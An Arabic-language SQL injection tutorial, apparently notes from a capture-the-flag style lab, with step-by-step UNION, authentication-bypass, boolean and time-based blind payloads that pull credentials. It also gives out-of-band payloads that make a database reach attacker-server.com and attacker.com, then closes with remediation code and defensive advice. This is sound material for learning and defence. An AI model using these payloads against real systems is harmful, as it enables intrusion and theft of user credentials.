# SQL injection

<details>
   <summary> in-band SQLI </summary>

🧪 الجزء العملي - خطوة بخطوة
1. اكتشاف الثغرة:
افتح المتصفح، وروح للرابط اللي فيه id=1.

جرب تحط ' بعد الرقم كده:


```
id=1'
```
هتلاقي رسالة خطأ ظهرت.
ده معناه إن المدخل بتاعك داخل فعلاً جوه استعلام SQL، وده تأكيد إن فيه ثغرة.

2. نبدأ نستغلها بـ UNION
جرب كده:

```
id=1 UNION SELECT 1
```
هتلاقي رسالة خطأ بتقولك إن عدد الأعمدة مش متطابق.

جرب تزود الأعمدة:
```
id=1 UNION SELECT 1,2
```
لسه في Error؟ زود كمان:

```
id=1 UNION SELECT 1,2,3
```
كده اشتغل! ليه؟ لأن الاستعلام الأصلي بيرجع 3 أعمدة، فلازم الاتحاد يكون بنفس العدد.

3. نخلي الـ UNION يشتغل لوحده
يعني نمنع الاستعلام الأصلي من إرجاع نتيجة.

اعمل id=0 بدلاً من 1:
```
id=0 UNION SELECT 1,2,3
```
كده الصفحة هتعرض النتائج اللي انت رجعتها.

4. نعرض اسم قاعدة البيانات:
```
id=0 UNION SELECT 1,2,database()
```
هيظهر لك اسم قاعدة البيانات، مثلاً: sqli_one.

5. نعرض أسماء الجداول داخل قاعدة البيانات:
```
id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
النتيجة:
```
article,staff_users
```

يبقى فيه جدول اسمه staff_users ده غالبًا فيه اليوزرز.

6. نعرف أسماء الأعمدة داخل جدول staff_users:
```
id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
النتيجة:
```
id,username,password
```

7. نجيب اليوزرات والباسوردات:
```
id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
هتلاقي النتائج بتظهر كده:

```
martin:123456
admin:qwerty
```


✅ ملخص سريع:

الخطوة | الهدف
------------|---------------------
' | تأكد وجود الثغرة
UNION SELECT 1,2,3 | تأكد من عدد الأعمدة
database() | جبت اسم قاعدة البيانات
information_schema.tables | جبت أسماء الجداول
information_schema.columns | جبت أسماء الأعمدة
staff_users | جبت البيانات الحساسة زي الباسورد

  
</details>






<details>
     <summary>Blind SQLI (Authentication Bypass)</summary>

      🕶️ Blind SQL Injection (الحقنة العمياء)
يعني إيه "Blind"؟
يعني مافيش رسائل خطأ، ولا داتا طالعة على الشاشة تقولك إن الهجمة نجحت.

لكن بالرغم من كده، الحقنة (injection) شغالة، بس السيرفر مابيظهرلكش حاجة مباشرة تقولك كده.

🧠 طيب نستفيد منها إزاي؟
كل اللي إحنا محتاجينه هو "رد فعل بسيط" من الموقع.
يعني مثلاً:

لو طلعلك صفحة معينة = الاستعلام نجح.

لو فضلك على نفس الصفحة = الاستعلام فشل.

وده كفاية إننا نبدأ نشتغل ونستخرج معلومات من قاعدة البيانات حتى لو بشكل بطيء.

🔓 Bypassing Authentication (تخطي تسجيل الدخول)
دي واحدة من أسهل الطرق في Blind SQLi، وممكن نكسر بيها فورم تسجيل الدخول.

🤔 إزاي بيشتغل تسجيل الدخول أصلاً؟
الموقع بيعمل استعلام بالشكل ده:

```
SELECT * FROM users WHERE username = 'ali' AND password = '123456' LIMIT 1;
```
لو فيه مستخدم بالبيانات دي، الاستعلام بيرجع صف واحد → يبقى المستخدم يدخل.

📌 إحنا نعمل إيه؟ نضحك على الاستعلام!
بدل ما نحاول نخمن Username وPassword، إحنا هنخلي الاستعلام يرجع نتيجة مهما كانت البيانات غلط.

🎯 الطريقة:
في خانة الـ Password، نكتب:

```
' OR 1=1;--
```
ده بيحوّل الاستعلام إلى:

```
SELECT * FROM users WHERE username = '' AND password = '' OR 1=1;--
```
شرحها:

'' AND '' → ده هيرجع false.

OR 1=1 → ده true دايمًا.

-- → ده بيعلّق باقي الاستعلام (يعني أي حاجة بعده مش بتتنفذ).

فالاستعلام كله بيرجع true، وكأنك سجلت دخولك بنجاح، حتى من غير Username أو Password!

✅ النتيجة:
لو الموقع معمول بشكل غير آمن، هيسمحلك بالدخول من غير بيانات صحيحة.

🛠️ ملحوظة مهمة:
لو ما نفعش:

جرب أنواع مختلفة من علامات التنصيص: " OR 1=1-- أو حتى ') OR ('1'='1.

جرب تحط القيمة في خانة الـ Username بدل Password.

🔐 ملخص سريع:



   العنصر | الوصف
   -------------|----------------
الهدف | تخطي تسجيل الدخول
نوع الهجوم | Blind SQLi
الوسيلة | استغلال منطق التحقق من صحة البيانات
الباي لود | ' OR 1=1;--
        
</details>






<details>
   <summary>Blind SQLi - (Boolean Based)</summary>

   🕵️‍♂️ يعني إيه Boolean-Based Blind SQL Injection؟
النوع ده من الـ SQLi بيشتغل على إنك ما بتاخدش بيانات واضحة من السيرفر، لكن السيرفر بيرد عليك بـ حاجة ثنائية (صح أو غلط)، زي:

true / false

1 / 0

yes / no

أو مثلًا تظهر صفحة أو ما تظهرش.

والحيلة هنا إنك تراقب رد الفعل على الاستعلام، مش البيانات نفسها.

🎯 المثال العملي:
رابط زيه كده:

```
https://website.thm/checkuser?username=admin
```
الرد بيكون حاجة شبه:

```
{"taken":true}
```
يعني اسم المستخدم موجود.

لو كتبنا:

```
https://website.thm/checkuser?username=admin123
```
هيكون الرد:

```
{"taken":false}
```
يعني الاسم مش موجود.

فهمنا كده إن فيه API بتشيك هل اسم المستخدم موجود ولا لأ.

🛠️ الاستعلام اللي السيرفر بيشغله غالبًا شكله كده:
```
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```
واحنا بنقدر نتحكم في %username% من خلال الرابط.

✅ الهدف الأول: نعرف عدد الأعمدة
نبدأ نضيف استعلام UNION، ونجرب نعرف عدد الأعمدة في الجدول.
نجرب مثلاً:

```
admin123' UNION SELECT 1;--
```
لو السيرفر رجّع false → يبقى عدد الأعمدة مش 1.
نزيد شوية:

```
admin123' UNION SELECT 1,2;--
```
برضو false → مش 2.

لحد ما نوصل:

```
admin123' UNION SELECT 1,2,3;--
```
وهنا هنلاقي {"taken": true}
يبقى كده عرفنا إن الجدول بيرجع 3 أعمدة. ✅

🔍 الهدف الثاني: نعرف اسم قاعدة البيانات
نستخدم الدالة database() اللي بترجع اسم قاعدة البيانات الحالية.

نجرب حاجة بسيطة:

```
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```
% معناها أي حاجة، فالنتيجة هتبقى true.

نجرب نحصر أكتر:

```
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```
لو النتيجة false → يبقى الاسم مش بيبدأ بـ a.

نكمل نحاول بالحروف:

b%

c%

... لحد ما نلاقي:

```
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
```
يعني الاسم بيبدأ بـ s.

نبدأ نحاول حرف حرف:

sa%

sb%

sq%

...

لحد ما نوصل لـ sqli_three ✅

🧱 الهدف الثالث: نكتشف أسماء الجداول
نروح على information_schema.tables ونستخدم نفس الطريقة:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'a%';--
```
لو false → نغير الحرف.

نجرب لحد ما نلاقي:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name='users';--
```
يبقى فيه جدول اسمه users ✅

🧩 الهدف الرابع: نكتشف أسماء الأعمدة في جدول users
نروح على:

```
information_schema.columns
```
ونجرب:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema='sqli_three' AND table_name='users' AND column_name LIKE 'a%';--
```
كل مرة نكتشف عمود، نستبعده عشان نكمل نجيب الباقي:

```
... AND column_name != 'id'
```
وهكذا نكررها لحد ما نكتشف الأعمدة:

id

username

password ✅

🔐 الهدف الأخير: نكتشف بيانات المستخدم (اسم وكلمة مرور)
نبدأ باسم المستخدم:
```
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
```
نكرر لحد ما نعرف إن فيه username اسمه admin.

بعد كده نجيب الباسورد:
```
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '3%';--
```
نجرب حرف حرف لحد ما نوصل للباسورد الكامل:

```
3845 ✅
```
🎉 النتيجة:
قدرنا من غير ما نشوف بيانات مباشرة نعرف:

اسم قاعدة البيانات.

اسم الجدول.

أسماء الأعمدة.

اسم المستخدم.

الباسورد.

وكل ده عن طريق الملاحظة الذكية لردود السيرفر.
   
   
</details>













<details>
   <summary>Blind SQLi - (Time Based)</summary>

   ⏱️ إيه هو Time-Based Blind SQL Injection؟
النوع ده بيشتغل على مبدأ:

"لو الاستعلام اتحقق صح، نفّذ SLEEP(x) واتأخر في الرد."

ولو ما اتأخرش، يبقى الاستعلام فشل أو ما تنفذش بالطريقة اللي إحنا عايزينها.

🔧 بنستخدم فين SLEEP()؟
في قواعد البيانات زي MySQL، فيه دالة اسمها SLEEP(5) بتخلّي السيرفر يستنى 5 ثواني قبل ما يرد.

💡 الهدف الأول: نعرف عدد الأعمدة
بنبدأ باستعلام بسيط زي:

```
admin123' UNION SELECT SLEEP(5);--
```
لو السيرفر ما اتأخرش → يبقى الاستعلام غلط.

نزوّد عمود كده:

```
admin123' UNION SELECT SLEEP(5), 2;--
```
لو حصل تأخير 5 ثواني → يبقى عدد الأعمدة = 2 ✅

لو ما حصلش، نزود:

```
admin123' UNION SELECT SLEEP(5), 2, 3;--
```
ونكمل لحد ما نحصل على التأخير → ده معناه إننا عرفنا عدد الأعمدة.

🧱 زي boolean-based، نكمل بنفس الطريقة لكن بنقيس الوقت:
🧠 اكتشاف اسم قاعدة البيانات:
نستخدم database() ومعاها شرط LIKE وسليب:

```
admin123' UNION SELECT SLEEP(5), 2 WHERE database() LIKE 's%';--
```
لو حصل تأخير → يبقى الاسم بيبدأ بـ s
لو ما حصلش → جرّب حرف تاني (a%, b%, c%, ...)

نكمّل حرف حرف:

sa%

sql%

sqli_t% ... لحد ما نوصل لـ sqli_three ✅

🧩 اكتشاف الجداول:
نروح على information_schema.tables ونكتب:

```
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'u%';--
```
لو حصل تأخير → فيه جدول بيبدأ بـ u.

نجرّب أكتر لحد ما نجيب:

```
table_name = 'users'
```
🧠 اكتشاف الأعمدة:
نكرر نفس الفكرة:

```
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.columns WHERE table_schema='sqli_three' AND table_name='users' AND column_name LIKE 'u%';--
```
كل مرة نكتشف عمود نعمل:

```
... AND column_name != 'username'
```
ونكررها لحد ما نكتشف: id, username, password ✅

🔓 استخراج بيانات الدخول:
أولًا: نجيب اسم المستخدم
```
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username LIKE 'a%';--
```
لحد ما نوصل لـ admin

ثانيًا: نجيب الباسورد
```
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '3%';--
```
نكمل:

38%

384%

3845 ✅

🎉 الخلاصة:
بالـ Time-Based SQLi:

بنكتشف الأعمدة من خلال زمن التأخير.

بنكرر نفس خطوات Boolean-Based لكن بذكاء مع الزمن.

الاختبار الحقيقي في المثابرة والتجريب واحدة واحدة.
   
</details>









<details>
   <summary>Out-of-Band SQLi</summary>

   📡 إيه هو Out-of-Band SQLi؟
النوع ده مش بيعتمد على ظهور بيانات مباشرة في الصفحة (زي In-Band)
ولا على تأخيرات أو استجابات منطقية (زي Boolean أو Time-based)

إنما بيعتمد على فكرة مختلفة شوية:

"أنا هبعت حاجة في الاستعلام تخلي قاعدة البيانات تتصل بجهازي أو سيرفر خارجي، وتبعتلي منه البيانات!"

يعني فيه قناتين:

🎯 قناة الهجوم = الريكوست اللي انت بعتّه للسيرفر (مثلاً POST أو GET).

📥 قناة التجميع = الاتصال اللي بيحصل من قاعدة البيانات لجهازك، زي DNS أو HTTP.

🧠 ازاي بيحصل الهجوم ده؟
خلينا نوضحها بخطوات:

🔍 تكتشف نقطة SQLi (زي أي نوع تاني).

💉 تكتب Payload خاص بيستخدم دوال زي:

LOAD_FILE()

xp_dirtree (في MSSQL)

UTL_HTTP.REQUEST() (في Oracle)

أو dnslookup() لو قاعدة البيانات تدعمها.

🌐 الاستعلام يجبر قاعدة البيانات تبعت طلب خارجي (DNS أو HTTP) لسيرفر انت بتتحكم فيه.

🛰️ انت بتراقب السيرفر ده، وتشوف البيانات وهي بتجيلك من الـ payload.

🧪 مثال عملي: (MySQL)
لو عندك دومين أو سيرفر انت بتملكه زي:

```
attacker-server.com
```
تكتب في خانة vulnerable:


```
' UNION SELECT LOAD_FILE('\\\\attacker-server.com\\data')--
```
أو (لو تشتغل مع MySQL/DNS):

```
'; SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker-server.com"> %ext;]>'),'/');--
```
ده يجبر قاعدة البيانات إنها تحاول تفتح اتصال HTTP لسيرفرك، وفيه ممكن تحط البايلود يبعَتلك داتا.

💡 في MSSQL:
```
'; exec master..xp_dirtree '\\attacker-server.com\share';--
```
ده بيخلي السيرفر يحاول يتصل على SMB Share، وده انت بتراقبه من جهازك أو سيرفرك.

🛠️ إزاي أراقب الطلبات دي؟
تشغّل أداة على جهازك أو سيرفرك زي:

🧰 Burp Collaborator أو

🛡️ Responder (لـ SMB)

🐍 أو حتى Script Python بـ Flask أو SimpleHTTPServer

🔬 DNS server مخصص، زي dnslog.cn

📛 ملحوظات مهمة:
النوع ده مش دايمًا بيشتغل، لأنه بيعتمد على:

إعدادات قاعدة البيانات

وجود صلاحيات كافية

إن الـ firewall ميسدّش الـ outgoing requests


🔐 الخلاصة:


العنصر | النوع
----------|----------------
طريقته | قناة هجوم + قناة استقبال خارجي
أدوات مساعدة | DNSLog / Burp Collaborator / Responder
يعتمد على | إرسال بيانات خارجية (HTTP, DNS, SMB)
فعال لما؟ | لما باقي الأنواع ماتديش أي feedback


   
</details>







---

## **``Remediation``**



🛡️ إزاي نحمي التطبيق من SQL Injection؟
فيه 3 وسائل أساسية اتكلم عنها الكلام اللي فوق، وهنشرح كل واحدة:

1. ✅ Prepared Statements (الاستعلامات المجهزة مسبقًا)
📌 يعني إيه؟
بدل ما تكتب الكود كده:

```
"SELECT * FROM users WHERE username = '" + userInput + "'"
```
بتكتبه بالشكل الآمن ده:

🔒 مثال آمن بلغة PHP (PDO):
```
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$userInput]);
```
أو بلغة Python:

```
cursor.execute("SELECT * FROM users WHERE username = %s", (user_input,))
```
✅ ده بيخلي الـ DB تعرف الفرق بين الكود والداتا، ومفيش injection ممكن يحصل.

2. 🧼 Input Validation (التحقق من البيانات)
📌 يعني إيه؟
تتأكد إن المستخدم بيكتب الحاجة اللي المفروض يكتبها فقط.

مثلًا: لو خانة فيها رقم، ماينفعش تقبل حروف أو رموز.

🔒 أمثلة:
في خانة ID → لازم يكون رقم بس (123)

في خانة username → تمنع الرموز الغريبة (< > ' " %)

📋 أفضل طريقة؟

استخدم Allow List (يعني تحدد إيه المسموح بيه بدل ما تمنع إيه الممنوع)

مثال: تقبل حروف A-Z و 0-9 بس.

3. 🔐 Escaping User Input (تخبيط الرموز الخطيرة)
📌 يعني إيه؟
لو المستخدم كتب حاجة فيها ' أو " أو \، دي رموز ممكن تخرب الاستعلام وتسبب injection.

🔧 الحل:
"Escape" الرموز دي يعني تضيف \ قبلها.

مثال: ' تتحول لـ \'

📌 معظم لغات البرمجة أو مكتبات الـ SQL بتوفر دوال بتعمل كده تلقائي، بس مش دايمًا كفاية لوحدها.

✅ خلاصة الكلام:


الطريقة | الحماية من
-------------|-----------------
✅ Prepared Statements | SQLi تمامًا
✅ Input Validation | تقليل المخاطر جدًا
✅ Escaping User Input | حماية إضافية، بس مش كفاية لوحدها


















<details>
   <summary>fixing codes</summary>

   ✅ كود الحماية لكل نوع من أنواع SQLi

النوع	كود الثغرة	الريمدييشن (الحماية)
✅ Classic (In-Band)		
php
Copy
Edit
$id = $_GET['id'];
mysqli_query($conn, "SELECT * FROM users WHERE id = '$id'");
|

php
Copy
Edit
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
| | ✅ Error-Based |

php
Copy
Edit
$name = $_GET['name'];
mysqli_query($conn, "SELECT * FROM users WHERE name = '$name'");
|

php
Copy
Edit
$stmt = $conn->prepare("SELECT * FROM users WHERE name = ?");
$stmt->bind_param("s", $name);
$stmt->execute();
| | ✅ Boolean-Based Blind |

php
Copy
Edit
$user = $_GET['user'];
mysqli_query($conn, "SELECT * FROM users WHERE username = '$user'");
|

php
Copy
Edit
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $user);
$stmt->execute();
| | ✅ Time-Based Blind |
نفس الكود اللي فوق (الحقن هو المختلف)
| نفس الكود: prepare + bind_param
| | ✅ Union-Based |

php
Copy
Edit
$id = $_GET['id'];
mysqli_query($conn, "SELECT name FROM products WHERE id = $id");
|

php
Copy
Edit
$stmt = $conn->prepare("SELECT name FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
| | ✅ Stacked Queries |

php
Copy
Edit
$id = $_GET['id'];
mysqli_multi_query($conn, "SELECT * FROM users WHERE id = $id");
|

php
Copy
Edit
// Avoid multi_query
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
| | ✅ Second Order |

php
Copy
Edit
// البيانات بتتخزن من غير فلترة
$name = $_POST['name'];
mysqli_query($conn, "INSERT INTO users (name) VALUES ('$name')");
|

php
Copy
Edit
$name = htmlspecialchars($_POST['name']);
$stmt = $conn->prepare("INSERT INTO users (name) VALUES (?)");
$stmt->bind_param("s", $name);
$stmt->execute();
| | ✅ Out-of-Band |

sql
Copy
Edit
'; exec xp_dirtree '\\attacker.com\pwn' --
|

استخدم Least Privilege

عطل xp_cmdshell, xp_dirtree

منع الإتصالات الخارجية في السيرفر
| | ✅ NoSQL Injection (Mongo) |

js
Copy
Edit
let query = { username: req.body.username };
db.users.find(query);
|

js
Copy
Edit
const Joi = require("joi");
const schema = Joi.object({
  username: Joi.string().alphanum().required()
});
const value = await schema.validateAsync(req.body);
   
</details>










<details>
   <summary>what if code safe</summary>

   🛡️ هل كود الحماية = حماية 100% من SQL Injection؟
الإجابة باختصار: لا، مش دايمًا 100%، لكن بيقلل الخطر جدًا.

كود الحماية زي Prepared Statements أو Parameterized Queries فعلاً بيمنع SQL Injection من جذوره في أغلب السيناريوهات، لكن فيه حالات خاصة أو أخطاء بشرية ممكن تفتح باب للاختراق برضه، زي:

🐞 سيناريوهات ممكن يحصل فيها اختراق رغم كود الحماية:

السبب | التوضيح
--------------|-----------------------
🔁 المطور نسي يستخدم prepared statements في جزء من الكود | ممكن يبقى عامل حماية في login بس، ونسيها في صفحة البحث
🧠 المطور استخدم dynamic SQL جوه التطبيق | زي بناء جزء من الـ query بناءً على input المستخدم، حتى لو استخدم prepared statement
🧹 الإدخال ما اتفلترش أو اتحقق منه كويس | حصل injection في مستوى تاني (Second-Order)
📦 مكتبة أو ORM مش آمنة | في بعض ORM systems بتعمل escaping ضعيف أو configurable
🧪 تم دمج أو استخدام مكتبة بتعمل SQL داخليًا بدون حماية | زي reports أو plugins داخل CMS
🌍 تم اختراق مكان تاني في التطبيق (LFI, RCE...) وقدر المهاجم يوصل للداتا | SQLi مش لازم تبقى المدخل الوحيد للهجوم




👨‍💻 طرق ممكن يخترق بيها الهاكر رغم وجود Prepared Statements:
1. Second-Order SQLi
بتحصل لما input المستخدم بيتخزن في الداتا من غير فلترة، ويتنفذ لاحقًا داخل Query.

2. Logical Bugs
زي لما الـ Prepared Query بيستخدم في شرط غلط أو بياخد input من مكان unexpected.

3. SQLi داخل ORM
بعض ORMs بيسمحوا بكتابة raw queries، لو المطور استخدمها غلط، الثغرة ممكن ترجع.

4. Bypass Filtering
مثلاً الـ filter بيمنع -- لكن مش بيمنع #، أو بيمنع ' لكن مش CHAR().

5. Data Leakage
الموقع آمن من SQLi، لكن فيه ثغرات تانية بتسرب بيانات أو تساعد في الـ recon.

✅ عشان الموقع يبقى حصن:
✅ استخدم Prepared Statements فـ كل نقطة فيها SQL.

✅ افصل بين logic والبيانات تمامًا (no dynamic queries).

✅ افلتِر كل input قبل التخزين أو التنفيذ.

✅ امنع الحسابات من استخدام أوامر dangerous (xp_cmdshell مثلاً).

✅ راجع الأكواد القديمة أو اللي مش أنت كاتبها.

✅ شغّل WAF (Web Application Firewall).

✅ راقب الـ logs لأي تصرف غريب (زي delay أو query فاشلة).

✅ اعمل pentest دوري أو استخدم أدوات scanning (زي SQLMap, Burp...).


   
</details>











